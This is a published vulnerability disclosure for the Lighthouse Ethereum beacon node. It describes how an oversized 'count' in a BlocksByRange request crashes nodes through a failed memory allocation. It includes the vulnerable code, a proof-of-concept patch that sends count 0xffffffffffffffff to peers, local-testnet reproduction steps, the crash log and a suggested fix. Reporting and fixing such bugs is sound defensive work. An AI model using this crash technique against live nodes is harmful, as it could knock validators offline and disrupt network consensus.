# [H] CL-2023-01: The lighthouse beacon nodes can be crashed via malicious BlocksByRange messages containing an overly large 'count' value

## Summary
Severity: High
Chain: Ethereum (consensus layer)
Component: Lighthouse
Published: 2023-05-03
Source: https://notes.ethereum.org/mw-M7HxuRM-09nSPVqp52A
Type: ef-disclosure

## Details
# The lighthouse beacon nodes can be crashed via malicious BlocksByRange messages containing an overly large 'count' value

## Short description
### 1 sentence description of the bug
The lighthouse beacon nodes can be crashed via malicious BlocksByRange messages containing an overly large 'count' value
## Attack scenario
### More detailed description of the attack/bug scenario and unexpected/buggy behaviour
(I apologise in advance for any formatting ugliness in this report. I wasn't too sure in what format you'd receive this, hence I'm unsure as to how I should apply formatting here. I've used markdown for code snippets)

Attackers are able to crash lighthouse nodes by sending malicious BlocksByRange messages. For reference, the relevant message structs are as follows:

(beacon_node/lighthouse_network/src/rpc/methods.rs)

```
/// Request a number of beacon block roots from a peer.
#[derive(Encode, Decode, Clone, Debug, PartialEq)]
pub struct BlocksByRangeRequest {
    /// The starting slot to request blocks.
    pub start_slot: u64,

    /// The number of blocks from the start slot.
    pub count: u64,
}

/// Request a number of beacon block roots from a peer.
#[derive(Encode, Decode, Clone, Debug, PartialEq)]
pub struct OldBlocksByRangeRequest {
    /// The starting slot to request blocks.
    pub start_slot: u64,

    /// The number of blocks from the start slot.
    pub count: u64,

    /// The step increment to receive blocks.
    ///
    /// A value of 1 returns every block.
    /// A value of 2 returns every second block.
    /// A value of 3 returns every third block and so on.
    pub step: u64,
}
```

The vulnerability exists due to use of the 'count' value found in an incoming BlocksByRange message for a memory allocation call without first validating 'count' to be a reasonable value. This unvalidated u64 'count' value is passed without input validation into VecDeque::with_capacity() so as to allocate a VecDeque object with sufficient size for the requested number of blocks. Since this 'count' value is a u64 and is not validated, a malicious BlocksByRange message can be crafted such that a very large 'count' value ends up being passed to VecDeque::with_capacity() so as to cause a panic upon allocation failure.

The affected code lives in beacon_node/lighthouse_network/src/rpc/handler.rs, in the inject_fully_negotiated_inbound(), and has been reproduced below. Note the annotations [1], [2] and [3] that I've added for illustrative purposes.

```
    fn inject_fully_negotiated_inbound(
        &mut self,
        substream: <Self::InboundProtocol as InboundUpgrade<NegotiatedSubstream>>::Output,
        _info: Self::InboundOpenInfo,
    ) {
        // only accept new peer requests when active
        if !matches!(self.state, HandlerState::Active) {
            return;
        }

        let (req, substream) = substream;
        let expected_responses = req.expected_responses();   // [1]

        // store requests that expect responses
        if expected_responses > 0 {
            if self.inbound_substreams.len() < MAX_INBOUND_SUBSTREAMS {
                // Store the stream and tag the output.
                let delay_key = self.inbound_substreams_delay.insert(
                    self.current_inbound_substream_id,
                    Duration::from_secs(RESPONSE_TIMEOUT),
                );
                let awaiting_stream = InboundState::Idle(substream);
                self.inbound_substreams.insert(
                    self.current_inbound_substream_id,
                    InboundInfo {
                        state: awaiting_stream,
                        pending_items: VecDeque::with_capacity(expected_responses as usize),    // [3] pass unvalidated u64 size value as capacity to allocate for VecDeque object
                        delay_key: Some(delay_key),
                        protocol: req.protocol(),
                        request_start_time: Instant::now(),
                        remaining_chunks: expected_responses,
                    },
                );
            } else {
                self.events_out.push(Err(HandlerErr::Inbound {
                    id: self.current_inbound_substream_id,
                    proto: req.protocol(),
                    error: RPCError::HandlerRejected,
                }));
                return self.shutdown(None);
            }
        }

....

    /// Number of responses expected for this request.
    pub fn expected_responses(&self) -> u64 {
        match self {
            InboundRequest::Status(_) => 1,
            InboundRequest::Goodbye(_) => 0,
            InboundRequest::BlocksByRange(req) => req.count,    // [2] for a BlocksByRange message, return the unvalidated u64 'count' member found in the BlocksByRange message itself
            InboundRequest::BlocksByRoot(req) => req.block_roots.len() as u64,
            InboundRequest::Ping(_) => 1,
            InboundRequest::MetaData(_) => 1,
        }
    }
```

The expected_responses() call at [1] will return 'count' as found in the incoming BlocksByRange message itself, with 'count' being a u64 and unvalidated, as previously mentioned; see [2]. Then, at [3], VecDeque::with_capacity() is called with this arbitrary and unvalidated u64 as the capacity to allocate for a VecDeque object. This will result in a panic if the allocation size is sufficiently large as to cause a memory allocation failure, since the memory allocation is infallible.

Causing a panic in the node will cause the panic handler setup in spawn_monitor() in common/task_executor/src/lib.rs to run, and this renders the node crashed.

Another route for exploitation would be to craft the BlocksByRange request such that 'count' is small enough to allow successful allocation but large enough that the OS' OOM killer soon afterwards shoots the process down with a SIGKILL.
## Impact
### Describe the effect this may have in a production setting
Crash arbitrary lighthouse nodes at will so as to cause serious liveness / PoS consensus problems in the network.
## Components
### Point to the files, functions, and/or specific line numbers where the bug occurs
inject_fully_negotiated_inbound() in beacon_node/lighthouse_network/src/rpc/handler.rs, i.e. https://github.com/sigp/lighthouse/blob/stable/beacon_node/lighthouse_network/src/rpc/handler.rs#L356
## Reproduction
### If used any sort of tools/simulations to find the bug, describe in detail how to reproduce the buggy behaviour.
I've managed to reproduce this issue in a local testnet by modifying the lighthouse node to send malicious BlocksByRange messages out to other peers. I did this by modifying the send_status() function in beacon_node/network/src/router/processor.rs to include code to send out BlocksByRange messages.

Please follow the steps below to reproduce the bug in a local testnet:

1. clone the lighthouse repository - i.e. git clone git@github.com:sigp/lighthouse.git

2. modify the send_status() function in beacon_node/network/src/router/processor.rs  to include code to build and send a malicious BlocksByRange message. As such, insert the following code at the end of the send_status() function:

```
        // send malicious BlocksByRange message here
        let blocks_by_range_message = BlocksByRangeRequest {
            start_slot: 5,
            count: 0xffffffffffffffff,
        };

        debug!(self.log, "---- Sending BlocksByRangeRequest Request");
        self.network
            .send_processor_request(peer_id, Request::BlocksByRange(blocks_by_range_message));
```

Note the very large 'count' value specified in the BlocksByRangeRequest object; i.e. UINT64_MAX, 0xffffffffffffffff.

My modified send_status() function was as follows after my modifications:

```
    /// Sends a `Status` message to the peer.
    ///
    /// Called when we first connect to a peer, or when the PeerManager determines we need to
    /// re-status.
    pub fn send_status(&mut self, peer_id: PeerId) {
        let status_message = status_message(&self.chain);
        debug!(self.log, "Sending Status Request"; "peer" => %peer_id, &status_message);
        self.network
            .send_processor_request(peer_id, Request::Status(status_message));

        // send malicious BlocksByRange message here
        let blocks_by_range_message = BlocksByRangeRequest {
            start_slot: 5,
            count: 0xffffffffffffffff,
        };

        debug!(self.log, "---- Sending BlocksByRangeRequest Request");
        self.network
            .send_processor_request(peer_id, Request::BlocksByRange(blocks_by_range_message));
    }
```

3. build the node by typing 'make' in the repository root directory

4. setup a local testnet. Start by cloning the https://github.com/sigp/lighthouse-ui repository, i.e. git clone git@github.com:sigp/lighthouse-ui.git

5. Move into the lighthouse-ui/local-testnet directory and increase beacon node count (BN_COUNT). I used 8 beacon nodes in my local testnet for no particular reason.

i.e. cd lighthouse-ui/local-testnet
vi vars.env

And then modify the 'BN_COUNT=...' line to read as 'BN_COUNT=8'

6. Run the start_local_testnet.sh bash script to spin up the local testnet.

i.e. ./start_local_testnet.sh

from the local-testnet directory.

7. Observe nodes crashing as they receive and handle malicious BlocksByRange messages from other peers

Inspection of the logs at lighthouse-ui/local-testnet/testnet-data/testnet/beacon_node_N.log (where N is the node number) will show Rust panic logs and will show the process being brought down.

For instance, in my testnet-data/testnet/beacon_node_2.log log file:

```
thread 'tokio-runtime-worker' panicked at 'capacity overflow', /rustc/69f9c33d71c871fc16ac445211281c6e7a340943/library/alloc/src/collections/vec_deque/mod.rs:587:9
stack backtrace:
   0: rust_begin_unwind
             at /rustc/69f9c33d71c871fc16ac445211281c6e7a340943/library/std/src/panicking.rs:575:5
   1: core::panicking::panic_fmt
             at /rustc/69f9c33d71c871fc16ac445211281c6e7a340943/library/core/src/panicking.rs:65:14
   2: <lighthouse_network::rpc::handler::RPCHandler<Id,TSpec> as libp2p_swarm::handler::ConnectionHandler>::inject_fully_negotiated_inbound
   3: libp2p_swarm::connection::handler_wrapper::HandlerWrapper<TConnectionHandler>::poll
   4: libp2p_swarm::connection::Connection<THandler>::poll
   5: <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll
   6: <futures_util::future::select::Select<A,B> as core::future::future::Future>::poll
   7: <futures_util::future::future::Map<Fut,F> as core::future::future::Future>::poll
   8: <futures_util::future::future::flatten::Flatten<Fut,<Fut as core::future::future::Future>::Output> as core::future::future::Future>::poll
   9: tokio::runtime::task::harness::Harness<T,S>::poll
  10: std::thread::local::LocalKey<T>::with
  11: tokio::runtime::scheduler::multi_thread::worker::Context::run_task
  12: tokio::runtime::scheduler::multi_thread::worker::Context::run
  13: tokio::macros::scoped_tls::ScopedKey<T>::set
  14: tokio::runtime::scheduler::multi_thread::worker::run
  15: <tokio::runtime::blocking::task::BlockingTask<T> as core::future::future::Future>::poll
  16: tokio::runtime::task::harness::Harness<T,S>::poll
  17: tokio::runtime::blocking::pool::Inner::run
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
Jan 04 00:26:59.556 CRIT Task panic. This is a bug!              advice: Please check above for a backtrace and notify the developers, message: capacity overflow, 
task_name: libp2p
Jan 04 00:26:59.556 INFO Internal shutdown received              reason: Panic (fatal error)
Jan 04 00:26:59.556 INFO Shutting down..                         reason: Failure("Panic (fatal error)")
Jan 04 00:26:59.559 INFO Saved DHT state                         service: network
Jan 04 00:26:59.559 INFO Network service shutdown                service: network
Jan 04 00:26:59.586 INFO HTTP API started                        listen_address: 127.0.0.1:8002
Jan 04 00:26:59.599 INFO Saved beacon chain to disk              service: beacon
Jan 04 00:26:59.638 INFO UPnP TCP route established              external_socket: :9002, service: UPnP
Jan 04 00:26:59.789 INFO UPnP UDP route established              external_socket: :9002, service: UPnP
Panic (fatal error)
```

As indicated in the panic trace, the panic occurred due to the VecDeque::with_capacity() call in inject_fully_negotiated_inbound(), with the panic taking place because of the overly large capacity value passed to VecDeque::with_capacity().
## Fix
### Description of suggested fix, if available
To prevent this attack, the 'count' u64 in the BlocksByRange / BlocksByRangeRequest message needs to be validated to ensure that it is a reasonable value (i.e. rather than some very large u64 that will cause a memory allocation failure panic in inject_fully_negotiated_inbound()).

Although you could validate the relevant 'count' value (expected_responses) in inject_fully_negotiated_inbound(), my feeling is that dodgy requests should've been kicked out before that point.

Instead, you may wish to handle this earlier on in the decoding code path, i.e. in decode() in beacon_node/lighthouse_network/src/rpc/codec/ssz_snappy.rs (line 139), since some other size-based validation already takes place here. 

Otherwise you might consider carrying out the boundary check on the 'count' field in handle_v1_request() and handle_v2_request() instead.

In any case, the fix would of course revolve around something like:

```
if req.count > SOME_SANE_MAX_VALUE {
  // kick this request out
}
```
